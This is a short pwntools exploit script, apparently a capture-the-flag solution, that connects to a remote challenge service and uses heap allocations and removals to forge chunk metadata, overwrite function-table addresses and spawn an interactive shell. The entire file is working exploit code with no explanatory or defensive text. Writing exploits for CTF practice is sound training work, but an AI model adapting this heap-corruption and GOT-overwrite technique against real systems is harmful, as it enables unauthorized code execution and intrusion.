from pwn import *

#r = remote('localhost', 8888)
r = remote('csie.ctf.tw',10153)
def add(idx, sz, d):
    r.send('add'+'\n')
    r.send(str(idx)+'\n')
    r.send(str(sz)+'\n')
    r.recvuntil('Data: ')
    r.send(d+'\n')

def rm(idx):
    r.send('remove'+'\n')
    r.send(str(idx)+'\n')

add(1, 168, 'A'*10)
add(2, 184, 'B'*10)
rm(1)
add(1, 168, 'A'*160 + p64(0x0130) + p64(0xc0) )

r.send('remove'.ljust(8) + p64(0) + p64(0x402070)+p64(0x402078)+'\n')
r.send('2'+'\n')
r.send('A'*0x18+p64(0x402028)+'\n')
r.send('sh\x00'.ljust(8)+p64(0x4007e6)+p64(0x4007a0)+'\n')
r.interactive()
